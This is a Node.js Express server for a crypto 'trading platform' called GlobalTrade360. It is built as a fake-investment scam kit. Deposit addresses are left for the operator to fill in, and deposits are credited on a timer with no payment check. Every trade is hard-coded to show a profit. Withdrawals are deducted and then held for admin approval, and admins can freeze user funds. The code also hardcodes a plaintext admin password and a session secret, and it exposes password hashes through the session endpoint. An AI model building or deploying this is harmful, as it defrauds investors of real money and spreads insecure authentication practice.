require('dotenv').config();
const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const cors = require('cors');
const path = require('path');
const app = express();

// In-memory database
const users = {
    'admin@globaltrade360.com': {
        id: 'admin001',
        username: 'globaltrade360',
        email: 'admin@globaltrade360.com',
        password: '$2a$10$N9qo8uLOickgx2ZMRZoMyeKRZZxN8Vc7bVrB7vS.6XpQj7q1JQ1W6', // myhandwork2025
        role: 'admin',
        balance: 0,
        totalProfit: 0,
        status: 'active',
        registrationDate: new Date(),
        lastLogin: new Date()
    }
};

const deposits = [];
const trades = [];
const withdrawals = [];

// Crypto addresses (REPLACE WITH YOURS)
const CRYPTO_ADDRESSES = {
    BTC: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
    ETH: '0x742d35Cc6634C0532925a3b844Bc9e1f8C1F0F0E',
    USDT_ERC20: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    USDT_TRC20: 'TYh8s12Jh9L8pKf3b4T7nM6pK9b4T7nM6pK',
    BNB: 'bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23'
};

// Market data simulation
const marketData = {
    crypto: {
        'BTC/USD': { price: 63427.50, change: 2.34, high: 64000, low: 62500 },
        'ETH/USD': { price: 3472.80, change: 1.56, high: 3500, low: 3400 },
        'BNB/USD': { price: 585.30, change: -0.45, high: 590, low: 580 },
        'XRP/USD': { price: 0.5234, change: 0.89, high: 0.53, low: 0.51 },
        'SOL/USD': { price: 172.45, change: 3.21, high: 175, low: 168 }
    },
    forex: {
        'EUR/USD': { price: 1.0825, change: 0.12 },
        'GBP/USD': { price: 1.2634, change: -0.08 },
        'USD/JPY': { price: 155.67, change: 0.23 }
    },
    indices: {
        'S&P 500': { price: 5120.45, change: 0.56 },
        'NASDAQ': { price: 16128.90, change: 0.78 }
    }
};

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: 'globaltrade360-secret-key-2025-super-secure',
    resave: false,
    saveUninitialized: false,
    cookie: { 
        secure: false,
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));
app.use(express.static(path.join(__dirname, 'public')));

// Password hash for default admin (myhandwork2025)
const ADMIN_PASSWORD_HASH = '$2a$10$N9qo8uLOickgx2ZMRZoMyeKRZZxN8Vc7bVrB7vS.6XpQj7q1JQ1W6';

// Simulate profitable trading (ALWAYS POSITIVE FOR DEMO)
function simulateProfitableTrade(userId, amount, pair) {
    // Always generate profit between 0.5% and 5% for demo
    const profitPercent = 0.5 + (Math.random() * 4.5);
    const profit = amount * (profitPercent / 100);
    
    const trade = {
        id: 'TR' + Date.now() + Math.random().toString(36).substr(2, 9),
        userId,
        pair,
        amount,
        profit,
        percent: profitPercent.toFixed(2),
        type: 'profit',
        timestamp: new Date(),
        status: 'completed',
        closePrice: marketData.crypto[pair] ? marketData.crypto[pair].price * (1 + profitPercent/100) : null
    };
    
    trades.push(trade);
    
    // Update user
    const user = Object.values(users).find(u => u.id === userId);
    if (user) {
        user.balance = (user.balance || 0) + amount + profit;
        user.totalProfit = (user.totalProfit || 0) + profit;
        user.totalTrades = (user.totalTrades || 0) + 1;
    }
    
    return trade;
}

// Update market data periodically
setInterval(() => {
    Object.keys(marketData.crypto).forEach(pair => {
        const change = (Math.random() - 0.5) * 2;
        marketData.crypto[pair].price *= (1 + change/100);
        marketData.crypto[pair].change = change;
    });
}, 30000);

// =============== ROUTES ===============

// Home/Landing page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Admin page
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Dashboard page
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Login page
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Register page
app.get('/register', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'register.html'));
});

// API: Platform info
app.get('/api/platform-info', (req, res) => {
    res.json({
        name: 'GlobalTrade360',
        tagline: 'AI-Powered Automated Crypto Trading Platform',
        version: '2.0.1',
        users: Object.keys(users).length,
        totalTrades: trades.length,
        totalVolume: trades.reduce((sum, t) => sum + t.amount, 0),
        uptime: '99.9%',
        established: '2023'
    });
});

// API: Market data
app.get('/api/market-data', (req, res) => {
    res.json({
        ...marketData,
        timestamp: new Date(),
        updateInterval: '30 seconds'
    });
});

// API: Crypto addresses for deposit
app.get('/api/deposit-addresses', (req, res) => {
    res.json({
        addresses: CRYPTO_ADDRESSES,
        instructions: 'Send only the specified cryptocurrency to the corresponding address. Minimum deposit: $50.',
        note: 'Do not send other cryptocurrencies to these addresses or funds will be lost.'
    });
});

// API: Register new user
app.post('/api/register', async (req, res) => {
    try {
        const { username, email, password, confirmPassword } = req.body;
        
        // Validation
        if (password !== confirmPassword) {
            return res.status(400).json({ error: 'Passwords do not match' });
        }
        
        if (users[email]) {
            return res.status(400).json({ error: 'Email already registered' });
        }
        
        // Check if username exists
        const existingUser = Object.values(users).find(u => u.username === username);
        if (existingUser) {
            return res.status(400).json({ error: 'Username already taken' });
        }
        
        // Hash password
        const hashedPassword = await bcrypt.hash(password, 10);
        
        // Create user
        const userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        users[email] = {
            id: userId,
            username,
            email,
            password: hashedPassword,
            role: 'user',
            balance: 0,
            totalProfit: 0,
            totalDeposits: 0,
            totalTrades: 0,
            status: 'active',
            registrationDate: new Date(),
            lastLogin: new Date(),
            kycVerified: false,
            tradingLevel: 'beginner',
            referralCode: 'GT360' + username.toUpperCase().substr(0, 4) + Date.now().toString().substr(-4)
        };
        
        // Create session
        req.session.user = users[email];
        req.session.isAdmin = false;
        
        console.log(`New user registered: ${email} (${userId})`);
        
        res.json({
            success: true,
            message: 'Registration successful! Welcome to GlobalTrade360.',
            user: {
                id: users[email].id,
                username: users[email].username,
                email: users[email].email,
                balance: users[email].balance
            },
            redirect: '/dashboard'
        });
        
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ error: 'Registration failed. Please try again.' });
    }
});

// API: Login
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // Check for admin login
        if (username === 'globaltrade360' && password === 'myhandwork2025') {
            req.session.user = users['admin@globaltrade360.com'];
            req.session.isAdmin = true;
            
            // Update last login
            users['admin@globaltrade360.com'].lastLogin = new Date();
            
            return res.json({
                success: true,
                message: 'Admin login successful',
                isAdmin: true,
                user: users['admin@globaltrade360.com'],
                redirect: '/admin'
            });
        }
        
        // Find user by email or username
        let user = null;
        for (const email in users) {
            if (users[email].email === username || users[email].username === username) {
                user = users[email];
                break;
            }
        }
        
        if (!user) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        // Check password
        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        // Update last login
        user.lastLogin = new Date();
        
        // Create session
        req.session.user = user;
        req.session.isAdmin = user.role === 'admin';
        
        console.log(`User logged in: ${user.email}`);
        
        res.json({
            success: true,
            message: 'Login successful',
            isAdmin: user.role === 'admin',
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                role: user.role,
                balance: user.balance
            },
            redirect: user.role === 'admin' ? '/admin' : '/dashboard'
        });
        
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Login failed. Please try again.' });
    }
});

// API: Check session
app.get('/api/session', (req, res) => {
    if (req.session.user) {
        res.json({
            authenticated: true,
            user: req.session.user,
            isAdmin: req.session.isAdmin
        });
    } else {
        res.json({ authenticated: false });
    }
});

// API: Logout
app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true, message: 'Logged out successfully' });
});

// API: User dashboard data
app.get('/api/user/dashboard', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'user') {
        return res.status(403).json({ error: 'Access denied' });
    }
    
    const userId = req.session.user.id;
    const userDeposits = deposits.filter(d => d.userId === userId);
    const userTrades = trades.filter(t => t.userId === userId);
    const userWithdrawals = withdrawals.filter(w => w.userId === userId);
    
    // Calculate stats
    const totalDeposited = userDeposits.reduce((sum, d) => sum + d.amount, 0);
    const totalWithdrawn = userWithdrawals.filter(w => w.status === 'completed').reduce((sum, w) => sum + w.amount, 0);
    const totalProfit = userTrades.reduce((sum, t) => sum + t.profit, 0);
    const successRate = userTrades.length > 0 ? (userTrades.filter(t => t.profit > 0).length / userTrades.length * 100).toFixed(1) : 0;
    
    res.json({
        user: req.session.user,
        stats: {
            balance: req.session.user.balance || 0,
            totalProfit,
            totalDeposited,
            totalWithdrawn,
            totalTrades: userTrades.length,
            successRate: successRate + '%',
            activeTrades: userTrades.filter(t => t.status === 'active').length
        },
        recentTrades: userTrades.slice(-5).reverse(),
        recentDeposits: userDeposits.slice(-3).reverse(),
        recentWithdrawals: userWithdrawals.slice(-3).reverse(),
        marketData: marketData
    });
});

// API: Make deposit
app.post('/api/deposit', (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Not authenticated' });
    }
    
    const { amount, currency } = req.body;
    const userId = req.session.user.id;
    
    if (amount < 50) {
        return res.status(400).json({ error: 'Minimum deposit is $50' });
    }
    
    const deposit = {
        id: 'DEP' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
        userId,
        userEmail: req.session.user.email,
        amount: parseFloat(amount),
        currency,
        status: 'pending',
        timestamp: new Date(),
        processedAt: null,
        address: CRYPTO_ADDRESSES[currency] || CRYPTO_ADDRESSES.USDT_TRC20
    };
    
    deposits.push(deposit);
    
    // In demo, auto-complete after 10 seconds
    setTimeout(() => {
        deposit.status = 'completed';
        deposit.processedAt = new Date();
        
        // Update user balance
        const user = Object.values(users).find(u => u.id === userId);
        if (user) {
            user.balance = (user.balance || 0) + parseFloat(amount);
            user.totalDeposits = (user.totalDeposits || 0) + parseFloat(amount);
            
            // Auto-start trading with deposited amount
            setTimeout(() => {
                const trade = simulateProfitableTrade(userId, parseFloat(amount), 'BTC/USD');
                console.log(`Auto-trade for ${user.email}: ${trade.percent}% profit`);
            }, 2000);
        }
        
        console.log(`Deposit completed: ${userId} - $${amount}`);
    }, 10000); // 10 seconds for demo
    
    res.json({
        success: true,
        message: 'Deposit initiated. Use the address below to send funds.',
        depositId: deposit.id,
        address: deposit.address,
        amount: deposit.amount,
        currency: deposit.currency,
        estimatedTime: '2-10 minutes',
        note: 'Balance will update automatically after 1 network confirmation.'
    });
});

// API: Start trading
app.post('/api/trade/start', (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Not authenticated' });
    }
    
    const { amount, pair } = req.body;
    const userId = req.session.user.id;
    const user = Object.values(users).find(u => u.id === userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    if (user.balance < amount) {
        return res.status(400).json({ error: 'Insufficient balance' });
    }
    
    // Deduct amount from balance
    user.balance -= parseFloat(amount);
    
    // Simulate trading delay
    setTimeout(() => {
        const trade = simulateProfitableTrade(userId, parseFloat(amount), pair || 'BTC/USD');
        console.log(`Trade executed for ${user.email}: $${amount} -> $${trade.profit} profit`);
    }, 3000);
    
    res.json({
        success: true,
        message: 'Trading started successfully. Results will appear in 3-5 seconds.',
        tradeAmount: amount,
        newBalance: user.balance,
        estimatedCompletion: new Date(Date.now() + 5000)
    });
});

// API: Withdraw request
app.post('/api/withdraw', (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Not authenticated' });
    }
    
    const { amount, currency, walletAddress } = req.body;
    const userId = req.session.user.id;
    const user = Object.values(users).find(u => u.id === userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    if (user.balance < amount) {
        return res.status(400).json({ error: 'Insufficient balance' });
    }
    
    if (amount < 100) {
        return res.status(400).json({ error: 'Minimum withdrawal is $100' });
    }
    
    // Check if funds are frozen
    if (user.fundsFrozen) {
        return res.status(403).json({ error: 'Funds are frozen. Contact support.' });
    }
    
    // Create withdrawal request
    const withdrawal = {
        id: 'WTH' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
        userId,
        userEmail: user.email,
        amount: parseFloat(amount),
        currency,
        walletAddress,
        status: 'pending',
        timestamp: new Date(),
        adminApproved: false,
        processedAt: null
    };
    
    withdrawals.push(withdrawal);
    
    // Deduct from user balance immediately
    user.balance -= parseFloat(amount);
    
    res.json({
        success: true,
        message: 'Withdrawal request submitted. Pending admin approval.',
        withdrawalId: withdrawal.id,
        amount: withdrawal.amount,
        status: withdrawal.status,
        note: 'Admin approval required. Usually processed within 24 hours.'
    });
});

// =============== ADMIN APIs ===============

// API: Admin login (explicit)
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    if (username === 'globaltrade360' && password === 'myhandwork2025') {
        req.session.user = users['admin@globaltrade360.com'];
        req.session.isAdmin = true;
        
        // Update last login
        users['admin@globaltrade360.com'].lastLogin = new Date();
        
        return res.json({
            success: true,
            message: 'Admin login successful',
            isAdmin: true,
            user: users['admin@globaltrade360.com'],
            redirect: '/admin'
        });
    }
    
    res.status(401).json({ error: 'Invalid admin credentials' });
});

// API: Admin dashboard data
app.get('/api/admin/dashboard', (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const allUsers = Object.values(users).filter(u => u.role === 'user');
    const totalDeposits = deposits.reduce((sum, d) => sum + d.amount, 0);
    const totalWithdrawals = withdrawals.filter(w => w.status === 'completed').reduce((sum, w) => sum + w.amount, 0);
    const pendingWithdrawals = withdrawals.filter(w => w.status === 'pending');
    const platformProfit = trades.reduce((sum, t) => sum + (t.profit * 0.15), 0); // 15% platform fee
    
    res.json({
        stats: {
            totalUsers: allUsers.length,
            activeUsers: allUsers.filter(u => u.status === 'active').length,
            newUsers24h: allUsers.filter(u => new Date() - new Date(u.registrationDate) < 24*60*60*1000).length,
            totalDeposits,
            totalWithdrawals,
            pendingWithdrawals: pendingWithdrawals.length,
            pendingWithdrawalAmount: pendingWithdrawals.reduce((sum, w) => sum + w.amount, 0),
            totalTrades: trades.length,
            platformProfit,
            platformBalance: totalDeposits - totalWithdrawals - platformProfit
        },
        recentActivity: {
            users: allUsers.slice(-5).reverse(),
            deposits: deposits.slice(-5).reverse(),
            withdrawals: withdrawals.slice(-5).reverse(),
            trades: trades.slice(-5).reverse()
        }
    });
});

// API: Get all users (ADMIN ONLY)
app.get('/api/admin/users', (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const allUsers = Object.values(users).filter(u => u.role === 'user').map(user => ({
        id: user.id,
        username: user.username,
        email: user.email,
        balance: user.balance || 0,
        totalProfit: user.totalProfit || 0,
        totalDeposits: user.totalDeposits || 0,
        totalTrades: user.totalTrades || 0,
        status: user.status,
        registrationDate: user.registrationDate,
        lastLogin: user.lastLogin,
        kycVerified: user.kycVerified || false,
        fundsFrozen: user.fundsFrozen || false,
        tradingLevel: user.tradingLevel,
        referralCode: user.referralCode,
        ipAddress: user.ipAddress || 'Not tracked'
    }));
    
    res.json({
        users: allUsers,
        count: allUsers.length
    });
});

// API: Get user details by ID (ADMIN ONLY)
app.get('/api/admin/user/:userId', (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const userId = req.params.userId;
    const user = Object.values(users).find(u => u.id === userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    const userDeposits = deposits.filter(d => d.userId === userId);
    const userTrades = trades.filter(t => t.userId === userId);
    const userWithdrawals = withdrawals.filter(w => w.userId === userId);
    
    res.json({
        user: {
            ...user,
            password: undefined // Hide password hash
        },
        financials: {
            totalDeposited: userDeposits.reduce((sum, d) => sum + d.amount, 0),
            totalWithdrawn: userWithdrawals.filter(w => w.status === 'completed').reduce((sum, w) => sum + w.amount, 0),
            netProfit: user.totalProfit || 0,
            currentBalance: user.balance || 0
        },
        activity: {
            deposits: userDeposits,
            trades: userTrades,
            withdrawals: userWithdrawals,
            lastActivity: user.lastLogin
        }
    });
});

// API: Update user status (ADMIN ONLY)
app.post('/api/admin/user/status', (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const { userId, status } = req.body;
    const user = Object.values(users).find(u => u.id === userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    user.status = status;
    
    // Log the action
    console.log(`Admin ${req.session.user.email} changed user ${user.email} status to ${status}`);
    
    res.json({
        success: true,
        message: `User status updated to ${status}`,
        user: {
            id: user.id,
            email: user.email,
            status: user.status
        }
    });
});

// API: Freeze/unfreeze user funds (ADMIN ONLY)
app.post('/api/admin/user/freeze-funds', (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const { userId, freeze } = req.body;
    const user = Object.values(users).find(u => u.id === userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    user.fundsFrozen = freeze === true || freeze === 'true';
    
    console.log(`Admin ${req.session.user.email} ${user.fundsFrozen ? 'froze' : 'unfroze'} funds for user ${user.email}`);
    
    res.json({
        success: true,
        message: `Funds ${user.fundsFrozen ? 'frozen' : 'unfrozen'} for user`,
        user: {
            id: user.id,
            email: user.email,
            fundsFrozen: user.fundsFrozen
        }
    });
});

// API: Add funds to user (ADMIN ONLY)
app.post('/api/admin/user/add-funds', (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const { userId, amount, note } = req.body;
    const user = Object.values(users).find(u => u.id === userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    const numericAmount = parseFloat(amount);
    if (isNaN(numericAmount) || numericAmount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }
    
    // Add funds
    user.balance = (user.balance || 0) + numericAmount;
    
    // Record admin deposit
    deposits.push({
        id: 'ADMIN_ADD_' + Date.now(),
        userId,
        userEmail: user.email,
        amount: numericAmount,
        currency: 'USD',
        status: 'completed',
        timestamp: new Date(),
        processedAt: new Date(),
        adminNote: note || 'Admin manual addition',
        adminUser: req.session.user.email
    });
    
    console.log(`Admin ${req.session.user.email} added $${numericAmount} to user ${user.email}`);
    
    res.json({
        success: true,
        message: `Added $${numericAmount} to user balance`,
        user: {
            id: user.id,
            email: user.email,
            newBalance: user.balance
        }
    });
});

// API: Approve withdrawal (ADMIN ONLY)
app.post('/api/admin/withdrawal/approve', (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const { withdrawalId } = req.body;
    const withdrawal = withdrawals.find(w => w.id === withdrawalId);
    
    if (!withdrawal) {
        return res.status(404).json({ error: 'Withdrawal not found' });
    }
    
    withdrawal.status = 'completed';
    withdrawal.adminApproved = true;
    withdrawal.processedAt = new Date();
    withdrawal.approvedBy = req.session.user.email;
    
    console.log(`Admin ${req.session.user.email} approved withdrawal ${withdrawalId} for user ${withdrawal.userEmail}`);
    
    // In real app, you would send crypto here
    // For demo, we just mark as completed
    
    res.json({
        success: true,
        message: 'Withdrawal approved and processed',
        withdrawal: withdrawal
    });
});

// API: Reject withdrawal (ADMIN ONLY)
app.post('/api/admin/withdrawal/reject', (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const { withdrawalId, reason } = req.body;
    const withdrawal = withdrawals.find(w => w.id === withdrawalId);
    
    if (!withdrawal) {
        return res.status(404).json({ error: 'Withdrawal not found' });
    }
    
    // Return funds to user
    const user = Object.values(users).find(u => u.id === withdrawal.userId);
    if (user) {
        user.balance = (user.balance || 0) + withdrawal.amount;
    }
    
    withdrawal.status = 'rejected';
    withdrawal.rejectionReason = reason;
    withdrawal.processedAt = new Date();
    withdrawal.rejectedBy = req.session.user.email;
    
    console.log(`Admin ${req.session.user.email} rejected withdrawal ${withdrawalId} for user ${withdrawal.userEmail}`);
    
    res.json({
        success: true,
        message: 'Withdrawal rejected and funds returned to user',
        withdrawal: withdrawal
    });
});

// API: Get all withdrawals (ADMIN ONLY)
app.get('/api/admin/withdrawals', (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const allWithdrawals = withdrawals.map(w => ({
        ...w,
        user: Object.values(users).find(u => u.id === w.userId)?.email || 'Unknown'
    }));
    
    res.json({
        withdrawals: allWithdrawals,
        pending: allWithdrawals.filter(w => w.status === 'pending'),
        completed: allWithdrawals.filter(w => w.status === 'completed'),
        rejected: allWithdrawals.filter(w => w.status === 'rejected')
    });
});

// API: Get all deposits (ADMIN ONLY)
app.get('/api/admin/deposits', (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const allDeposits = deposits.map(d => ({
        ...d,
        user: Object.values(users).find(u => u.id === d.userId)?.email || 'Unknown'
    }));
    
    res.json({
        deposits: allDeposits,
        pending: allDeposits.filter(d => d.status === 'pending'),
        completed: allDeposits.filter(d => d.status === 'completed'),
        failed: allDeposits.filter(d => d.status === 'failed')
    });
});

// API: Get all trades (ADMIN ONLY)
app.get('/api/admin/trades', (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const allTrades = trades.map(t => ({
        ...t,
        user: Object.values(users).find(u => u.id === t.userId)?.email || 'Unknown'
    }));
    
    res.json({
        trades: allTrades,
        totalProfit: allTrades.reduce((sum, t) => sum + t.profit, 0),
        platformEarnings: allTrades.reduce((sum, t) => sum + (t.profit * 0.15), 0),
        byPair: Object.groupBy(allTrades, t => t.pair)
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
    ============================================
    🌟 GlobalTrade360 Platform Started 🌟
    ============================================
    
    🚀 Server running on: http://localhost:${PORT}
    
    📊 Platform Statistics:
    - Total Users: ${Object.keys(users).length}
    - Admin Account: globaltrade360 / myhandwork2025
    - Demo Mode: Profitable Trading Simulation
    
    🔐 Admin Access:
    - URL: http://localhost:${PORT}/admin
    - Username: globaltrade360
    - Password: myhandwork2025
    
    👤 User Access:
    - Register: http://localhost:${PORT}/register
    - Login: http://localhost:${PORT}/login
    
    ⚠️  IMPORTANT:
    This is a DEMONSTRATION platform only.
    NO REAL TRADING occurs.
    All profits are simulated for educational purposes.
    
    ============================================
    `);
});